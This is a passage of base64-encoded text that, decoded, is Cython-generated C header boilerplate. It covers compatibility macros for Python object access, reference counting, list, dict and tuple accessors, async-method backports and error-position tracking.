CAjZW5kaWZcbiAgI2lmICFkZWZpbmVkKFB5Qnl0ZUFycmF5X0NoZWNrKVxuICAgICNkZWZpbmUgUHlCeXRlQXJyYXlfQ2hlY2sob2JqKSAgUHlPYmplY3RfVHlwZUNoZWNrKG9iaiwgJlB5Qnl0ZUFycmF5X1R5cGUpXG4gICNlbmRpZlxuICAjaWYgIWRlZmluZWQoUHlPYmplY3RfRm9ybWF0KVxuICAgICNkZWZpbmUgUHlPYmplY3RfRm9ybWF0KG9iaiwgZm10KSAgUHlPYmplY3RfQ2FsbE1ldGhvZChvYmosICJfX2Zvcm1hdF9fIiwgIk8iLCBmbXQpXG4gICNlbmRpZlxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gb3JtYXRTYWZlKGEsIGIpICAoKHVubGlrZWx5KChhKSA9PSBQeV9Ob25lIHx8IChQeVVuaWNvZGVfQ2hlY2soYikgJiYgIVB5VW5pY29kZV9DaGVja0V4YWN0KGIpKSkpID8gUHlOdW1iZXJfUmVtYWluZGVyKGEsIGIpIDogUHlVbmljb2RlX0Zvcm1hdChhLCBiKSlcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBFMDAwMFxuICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfTGlzdEtlZXBOZXcob2JqKVxcXG4gICAgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChvYmopICYmIFB5VW5zdGFibGVfT2JqZWN0X0lzVW5pcXVlbHlSZWZlcmVuY2VkKG9iaikpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeVNlcXVlbmNlX0xpc3Qob2JqKSlcbiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfTGlzdEtlZXBOZXcob2JqKVxcXG4gICAgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChvYmopICYmIFB5X1JFRkNOVChvYmopID09IDEpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeVNlcXVlbmNlX0xpc3Qob2JqKSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9MaXN0S2VlcE5ldyhvYmopICBQeVNlcXVlbmNlX0xpc3Qob2JqKVxuI2VuZGlmXG4jaWZuZGVmIFB5U2V0X0NoZWNrRXhhY3RcbiAgI2RlZmluZSBQeVNldF9DaGVja0V4YWN0KG9iaikgICAgICAgIF9fUHl4X0lTX1RZUEUob2JqLCAmUHlTZXRfVHlwZSlcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwQTRcbiAgI2RlZmluZSBfX1B5eF9TRVRfUkVGQ05UKG9iaiwgcmVmY250KSBQeV9TRVRfUkVGQ05UKG9iaiwgcmVmY250KVxuICAjZGVmaW5lIF9fUHl4X1NFVF9TSVpFKG9iaiwgc2l6ZSkgUHlfU0VUX1NJWkUob2JqLCBzaXplKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9TRVRfUkVGQ05UKG9iaiwgcmVmY250KSBQeV9SRUZDTlQob2JqKSA9IChyZWZjbnQpXG4gICNkZWZpbmUgX19QeXhfU0VUX1NJWkUob2JqLCBzaXplKSBQeV9TSVpFKG9iaikgPSAoc2l6ZSlcbiNlbmRpZlxuZW51bSBfX1B5eF9SZWZlcmVuY2VTaGFyaW5nIHtcbiAgX19QeXhfUmVmZXJlbmNlU2hhcmluZ19EZWZpbml0ZWx5VW5pcXVlLCAvLyBXZSBjcmVhdGVkIGl0IHNvIHdlIGtub3cgaXRcJ3MgdW5zaGFyZWQgLSBubyBuZWVkIHRvIGNoZWNrXG4gIF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfT3duU3Ryb25nUmVmZXJlbmNlLFxuICBfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX0Z1bmN0aW9uQXJndW1lbnQsXG4gIF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfU2hhcmVkUmVmZXJlbmNlLCAvLyBOZXZlciB0cnVzdCBpdCB0byBiZSB1bnNoYXJlZCBiZWNhdXNlIGl0XCdzIGEgZ2xvYmFsIG9yIHNpbWlsYXJcbn07XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBFMDAwMFxuI2RlZmluZSBfX1B5eF9JU19VTklRVUVMWV9SRUZFUkVOQ0VEKG8sIHNoYXJpbmcpXFxcbiAgICAoc2hhcmluZyA9PSBfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX0RlZmluaXRlbHlVbmlxdWUgPyAxIDpcXFxuICAgICAgKHNoYXJpbmcgPT0gX19QeXhfUmVmZXJlbmNlU2hhcmluZ19GdW5jdGlvbkFyZ3VtZW50ID8gUHlVbnN0YWJsZV9PYmplY3RfSXNVbmlxdWVSZWZlcmVuY2VkVGVtcG9yYXJ5KG8pIDpcXFxuICAgICAgKHNoYXJpbmcgPT0gX19QeXhfUmVmZXJlbmNlU2hhcmluZ19Pd25TdHJvbmdSZWZlcmVuY2UgPyBQeVVuc3RhYmxlX09iamVjdF9Jc1VuaXF1ZWx5UmVmZXJlbmNlZChvKSA6IDApKSlcbiNlbGlmIChDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HKSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4jZGVmaW5lIF9fUHl4X0lTX1VOSVFVRUxZX1JFRkVSRU5DRUQobywgc2hhcmluZykgKCgodm9pZClzaGFyaW5nKSwgUHlfUkVGQ05UKG8pID09IDEpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9JU19VTklRVUVMWV9SRUZFUkVOQ0VEKG8sIHNoYXJpbmcpICgoKHZvaWQpbyksICgodm9pZClzaGFyaW5nKSwgMClcbiNlbmRpZlxuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIHx8IENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlNcbiAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgUHlMaXN0X0dldEl0ZW1SZWYobywgaSlcbiAgI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgKGxpa2VseSgoaSkgPj0gMCkgPyBQeVNlcXVlbmNlX0dldEl0ZW0obywgaSkgOiAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJsaXN0IGluZGV4IG91dCBvZiByYW5nZSIpLCAoUHlPYmplY3QqKU5VTEwpKVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgUHlTZXF1ZW5jZV9JVEVNKG8sIGkpXG4gICNlbmRpZlxuI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSBQeUxpc3RfR2V0SXRlbVJlZihvLCBpKVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgX19QeXhfWE5ld1JlZihQeUxpc3RfR2V0SXRlbShvLCBpKSlcbiAgI2VuZGlmXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIGkpIF9fUHl4X05ld1JlZihQeUxpc3RfR0VUX0lURU0obywgaSkpXG4jZW5kaWZcbiNpZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZkZhc3QobywgaSwgdW5zYWZlX3NoYXJlZCkgKF9fUHl4X0lTX1VOSVFVRUxZX1JFRkVSRU5DRUQobywgdW5zYWZlX3NoYXJlZCkgP1xcXG4gICAgX19QeXhfTmV3UmVmKFB5TGlzdF9HRVRfSVRFTShvLCBpKSkgOiBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWZGYXN0KG8sIGksIHVuc2FmZV9zaGFyZWQpIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIGkpXG4jZW5kaWZcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoZGljdCwga2V5LCByZXN1bHQpIFB5RGljdF9HZXRJdGVtUmVmKGRpY3QsIGtleSwgcmVzdWx0KVxuI2VsaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgfHwgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RGljdF9HZXRJdGVtUmVmKFB5T2JqZWN0ICpkaWN0LCBQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqKnJlc3VsdCkge1xuICAqcmVzdWx0ID0gUHlPYmplY3RfR2V0SXRlbShkaWN0LCBrZXkpO1xuICBpZiAoKnJlc3VsdCA9PSBOVUxMKSB7XG4gICAgaWYgKFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfS2V5RXJyb3IpKSB7XG4gICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgIHJldHVybiAtMTtcbiAgfVxuICByZXR1cm4gMTtcbn1cbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoUHlPYmplY3QgKmRpY3QsIFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICoqcmVzdWx0KSB7XG4gICpyZXN1bHQgPSBQeURpY3RfR2V0SXRlbVdpdGhFcnJvcihkaWN0LCBrZXkpO1xuICBpZiAoKnJlc3VsdCA9PSBOVUxMKSB7XG4gICAgcmV0dXJuIFB5RXJyX09jY3VycmVkKCkgPyAtMSA6IDA7XG4gIH1cbiAgUHlfSU5DUkVGKCpyZXN1bHQpO1xuICByZXR1cm4gMTtcbn1cbiNlbmRpZlxuI2lmIGRlZmluZWQoQ1lUSE9OX0RFQlVHX1ZJU0lUX0NPTlNUKSAmJiBDWVRIT05fREVCVUdfVklTSVRfQ09OU1RcbiAgI2RlZmluZSBfX1B5eF9WSVNJVF9DT05TVChvYmopICBQeV9WSVNJVChvYmopXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1ZJU0lUX0NPTlNUKG9iailcbiNlbmRpZlxuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgI2RlZmluZSBfX1B5eF9QeVNlcXVlbmNlX0lURU0obywgaSkgUHlTZXF1ZW5jZV9JVEVNKG8sIGkpXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcSkgIFB5X1NJWkUoc2VxKVxuICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfU0VUX0lURU0obywgaSwgdikgKFB5VHVwbGVfU0VUX0lURU0obywgaSwgdiksICgwKSlcbiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKG8sIGkpIFB5VHVwbGVfR0VUX0lURU0obywgaSlcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfU0VUX0lURU0obywgaSwgdikgKFB5TGlzdF9TRVRfSVRFTShvLCBpLCB2KSwgKDApKVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfSVRFTShvLCBpKSBQeUxpc3RfR0VUX0lURU0obywgaSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9JVEVNKG8sIGkpIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKVxuICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfU0laRShzZXEpICBQeVNlcXVlbmNlX1NpemUoc2VxKVxuICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfU0VUX0lURU0obywgaSwgdikgUHlUdXBsZV9TZXRJdGVtKG8sIGksIHYpXG4gICNkZWZpbmUgX19QeXhfUHlUdXBsZV9HRVRfSVRFTShvLCBpKSBQeVR1cGxlX0dldEl0ZW0obywgaSlcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfU0VUX0lURU0obywgaSwgdikgUHlMaXN0X1NldEl0ZW0obywgaSwgdilcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR0VUX0lURU0obywgaSkgUHlMaXN0X0dldEl0ZW0obywgaSlcbiNlbmRpZlxuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICNkZWZpbmUgX19QeXhfUHlUdXBsZV9HRVRfU0laRShvKSBQeVR1cGxlX0dFVF9TSVpFKG8pXG4gICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9TSVpFKG8pIFB5TGlzdF9HRVRfU0laRShvKVxuICAjZGVmaW5lIF9fUHl4X1B5U2V0X0dFVF9TSVpFKG8pIFB5U2V0X0dFVF9TSVpFKG8pXG4gICNkZWZpbmUgX19QeXhfUHlCeXRlc19HRVRfU0laRShvKSBQeUJ5dGVzX0dFVF9TSVpFKG8pXG4gICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfR0VUX1NJWkUobykgUHlCeXRlQXJyYXlfR0VUX1NJWkUobylcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChvKSBQeVVuaWNvZGVfR0VUX0xFTkdUSChvKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKG8pIFB5VHVwbGVfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfU0laRShvKSBQeUxpc3RfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5U2V0X0dFVF9TSVpFKG8pIFB5U2V0X1NpemUobylcbiAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0dFVF9TSVpFKG8pIFB5Qnl0ZXNfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0dFVF9TSVpFKG8pIFB5Qnl0ZUFycmF5X1NpemUobylcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChvKSBQeVVuaWNvZGVfR2V0TGVuZ3RoKG8pXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgIWRlZmluZWQoUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcpXG4gICNkZWZpbmUgUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcocykgUHlVbmljb2RlX0Zyb21TdHJpbmcocylcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeUxvbmdfRnJvbUhhc2hfdCBQeUxvbmdfRnJvbVNzaXplX3RcbiNkZWZpbmUgX19QeXhfUHlMb25nX0FzSGFzaF90ICAgX19QeXhfUHlJbmRleF9Bc1NzaXplX3RcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDBcbiAgICAjZGVmaW5lIF9fUHl4X1B5U2VuZFJlc3VsdCBQeVNlbmRSZXN1bHRcbiNlbHNlXG4gICAgdHlwZWRlZiBlbnVtIHtcbiAgICAgICAgUFlHRU5fUkVUVVJOID0gMCxcbiAgICAgICAgUFlHRU5fRVJST1IgPSAtMSxcbiAgICAgICAgUFlHRU5fTkVYVCA9IDEsXG4gICAgfSBfX1B5eF9QeVNlbmRSZXN1bHQ7XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDBBM1xuICB0eXBlZGVmIF9fUHl4X1B5U2VuZFJlc3VsdCAoKl9fUHl4X3B5aXRlcl9zZW5kZnVuYykoUHlPYmplY3QgKml0ZXIsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXN1bHQpO1xuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgc2VuZGZ1bmNcbiNlbmRpZlxuI2lmICFDWVRIT05fVVNFX0FNX1NFTkRcbiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMFxuI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwXG4jZGVmaW5lIF9fUFlYX0hBU19QWV9BTV9TRU5EIDFcbiNlbHNlXG4jZGVmaW5lIF9fUFlYX0hBU19QWV9BTV9TRU5EIDIgIC8vIG91ciBvd24gYmFja3BvcnRlZCBpbXBsZW1lbnRhdGlvblxuI2VuZGlmXG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPCAyXG4gICAgI2RlZmluZSBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCBQeUFzeW5jTWV0aG9kc1xuI2Vsc2VcbiAgICB0eXBlZGVmIHN0cnVjdCB7XG4gICAgICAgIHVuYXJ5ZnVuYyBhbV9hd2FpdDtcbiAgICAgICAgdW5hcnlmdW5jIGFtX2FpdGVyO1xuICAgICAgICB1bmFyeWZ1bmMgYW1fYW5leHQ7XG4gICAgICAgIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kO1xuICAgIH0gX19QeXhfUHlBc3luY01ldGhvZHNTdHJ1Y3Q7XG4gICAgI2RlZmluZSBfX1B5eF9TbG90VHBBc0FzeW5jKHMpICgoUHlBc3luY01ldGhvZHMqKShzKSlcbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfQU1fU0VORCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwRjBcbiAgICAjZGVmaW5lIF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5EICgxVUwgPDwgMjEpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfVFBGTEFHU19IQVZFX0FNX1NFTkQgKDApXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwXG4jZGVmaW5lIF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSBQeUludGVycHJldGVyU3RhdGVfR2V0KClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSBQeVRocmVhZFN0YXRlX0dldCgpLT5pbnRlcnBcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwXG4jaWZkZWYgX19jcGx1c3BsdXNcbmV4dGVybiAiQyJcbiNlbmRpZlxuUHlBUElfRlVOQyh2b2lkICopIFB5TWVtX0NhbGxvYyhzaXplX3QgbmVsZW0sIHNpemVfdCBlbHNpemUpO1xuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKFB5T2JqZWN0ICppbnNwZWN0LCBjb25zdCBjaGFyKiBuYW1lLCBpbnQgKndyaXRlX3RvKSB7XG4gICAgaW50IHZhbHVlO1xuICAgIFB5T2JqZWN0ICpweV92YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoaW5zcGVjdCwgbmFtZSk7XG4gICAgaWYgKCFweV92YWx1ZSkgcmV0dXJuIDA7XG4gICAgdmFsdWUgPSAoaW50KSBQeUxvbmdfQXNMb25nKHB5X3ZhbHVlKTtcbiAgICBQeV9ERUNSRUYocHlfdmFsdWUpO1xuICAgICp3cml0ZV90byA9IHZhbHVlO1xuICAgIHJldHVybiB2YWx1ZSAhPSAtMSB8fCAhUHlFcnJfT2NjdXJyZWQoKTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfaW5pdF9jb192YXJpYWJsZXModm9pZCkge1xuICAgIFB5T2JqZWN0ICppbnNwZWN0O1xuICAgIGludCByZXN1bHQ7XG4gICAgaW5zcGVjdCA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiaW5zcGVjdCIpO1xuICAgIHJlc3VsdCA9XG4jaWYgIWRlZmluZWQoQ09fT1BUSU1JWkVEKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19PUFRJTUlaRUQiLCAmQ09fT1BUSU1JWkVEKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fTkVXTE9DQUxTKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19ORVdMT0NBTFMiLCAmQ09fTkVXTE9DQUxTKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fVkFSQVJHUylcbiAgICAgICAgX19QeXhfaW5pdF9jb192YXJpYWJsZShpbnNwZWN0LCAiQ09fVkFSQVJHUyIsICZDT19WQVJBUkdTKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fVkFSS0VZV09SRFMpXG4gICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX1ZBUktFWVdPUkRTIiwgJkNPX1ZBUktFWVdPUkRTKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fQVNZTkNfR0VORVJBVE9SKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19BU1lOQ19HRU5FUkFUT1IiLCAmQ09fQVNZTkNfR0VORVJBVE9SKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fR0VORVJBVE9SKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19HRU5FUkFUT1IiLCAmQ09fR0VORVJBVE9SKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fQ09ST1VUSU5FKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19DT1JPVVRJTkUiLCAmQ09fQ09ST1VUSU5FKSAmJlxuI2VuZGlmXG4gICAgICAgIDE7XG4gICAgUHlfREVDUkVGKGluc3BlY3QpO1xuICAgIHJldHVybiByZXN1bHQgPyAwIDogLTE7XG59XG4jZWxzZVxuc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcyh2b2lkKSB7XG4gICAgcmV0dXJuIDA7ICAvLyBJdFwncyBhIGxpbWl0ZWQgQVBJLW9ubHkgZmVhdHVyZVxufVxuI2VuZGlmXG5cblxuI2lmIGRlZmluZWQoX1dJTjMyKSB8fCBkZWZpbmVkKFdJTjMyKSB8fCBkZWZpbmVkKE1TX1dJTkRPV1MpXG4gICNpZm5kZWYgX1VTRV9NQVRIX0RFRklORVNcbiAgICAjZGVmaW5lIF9VU0VfTUFUSF9ERUZJTkVTXG4gICNlbmRpZlxuI2VuZGlmXG4jaW5jbHVkZSA8bWF0aC5oPlxuI2lmIGRlZmluZWQoX19DWUdXSU5fXykgJiYgZGVmaW5lZChfTERCTF9FUV9EQkwpXG4jZGVmaW5lIF9fUHl4X3RydW5jbCB0cnVuY1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfdHJ1bmNsIHRydW5jbFxuI2VuZGlmXG5cbiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FXG4jZGVmaW5lIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRSAwXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS1xuI2RlZmluZSBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS1xuI2RlZmluZSBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSAgeyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X2ZbZl9pbmRleF07ICh2b2lkKSBfX3B5eF9maWxlbmFtZTsgX19weXhfbGluZW5vID0gbGluZW5vOyAodm9pZCkgX19weXhfbGluZW5vOyBfX3B5eF9jbGluZW5vID0gX19MSU5FX187ICh2b2lkKSBfX3B5eF9jbGluZW5vOyB9XG4jZWxzZVxuI2RlZmluZSBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSAgeyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X2ZbZl9pbmRleF07ICh2b2lkKSBfX3B5eF9maWxlbmFtZTsgX19weXhfbGluZW5vID0gbGluZW5vOyAodm9pZCkgX19weXhfbGluZW5vOyAodm9pZCkgX19weXhfY2xpbmVubzsgfVxuI2VuZGlmXG4jZGVmaW5lIF9fUFlYX0VSUihmX2luZGV4LCBsaW5lbm8sIExuX2Vycm9yKSBcXFxuICAgIHsgX19QWVhfTUFSS19FUlJfUE9TKGZfaW5kZXgsIGxpbmVubykgZ290byBMbl9lcnJvcjsgfVxuXG4jaWZkZWYgQ1lUSE9OX0VYVEVSTl9DXG4gICAgI3VuZGVmIF9fUFlYX0VYVEVSTl9DXG4gICAgI2RlZmluZSBfX1BZWF9FWFRFUk5fQyBDWVRIT05fRVhURVJOX0NcbiNlbGlmIGRlZmluZWQoX19QWVhfRVhURVJOX0MpXG4gICAgI2lmZGVmIF9NU0NfVkVSXG4gICAgI3ByYWdtYSBtZXNzYWdlICgiUGxlYXNlIGRvIG5vdCBkZWZpbmUgdGhlIFwnX19QWVhfRVhURVJOX0NcJyBtYWNybyBleHRlcm5hbGx5LiBVc2UgXCdDWVRIT05fRVhURVJOX0NcJyBpbnN0ZWFkLiIpXG4gICAgI2Vsc2VcbiAgICAjd2FybmluZyBQbGVhc2UgZG8gbm90IGRlZmluZSB0aGUgXCdfX1BZWF9FWFRFUk5fQ1wnIG1hY3JvIGV4dGVybmFsbHkuIFVzZSBcJ0NZVEhPTl9FWFRFUk5fQ1wnIGluc3RlYWQuXG4gICAgI2VuZGlmXG4jZWxzZVxuICAjaWZkZWYgX19jcGx1c3BsdXNcbiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIGV4dGVybiAiQyJcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIGV4dGVyblxuICAjZW5kaWZcbiNlbmRpZlxuXG4jZGVmaW5lIF9fUFlYX0hBVkVfX3R0XG4jZGVmaW5lIF9fUFlYX0hBVkVfQVBJX190dFxuXG4jaWZkZWYgX09QRU5NUFxuI2luY2x1ZGUgPG9tcC5oPlxuI2VuZGlmIFxuXG4jaWYgZGVmaW5lZChQWVJFWF9XSVRIT1VUX0FTU0VSVElPTlMpICYmICFkZWZpbmVkKENZVEhPTl9XSVRIT1VUX0FTU0VSVElPTlMpXG4jZGVmaW5lIENZVEhPTl9XSVRIT1VUX0FTU0VSVElPTlNcbiNlbmRpZlxuXG4jZGVmaW5lIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIDBcbiNkZWZpbmUgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOCAwXG4jZGVmaW5lIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HICIiXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmdBbmRTaXplIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemVcbiNkZWZpbmUgX19QeXhfdWNoYXJfY2FzdChjKSAoKHVuc2lnbmVkIGNoYXIpYylcbiNkZWZpbmUgX19QeXhfbG9uZ19jYXN0KHgpICgobG9uZyl4KVxuI2RlZmluZSBfX1B5eF9maXRzX1B5X3NzaXplX3QodiwgdHlwZSwgaXNfc2lnbmVkKSAgKFxcXG4gICAgKHNpemVvZih0eXBlKSA8IHNpemVvZihQeV9zc2l6ZV90KSkgIH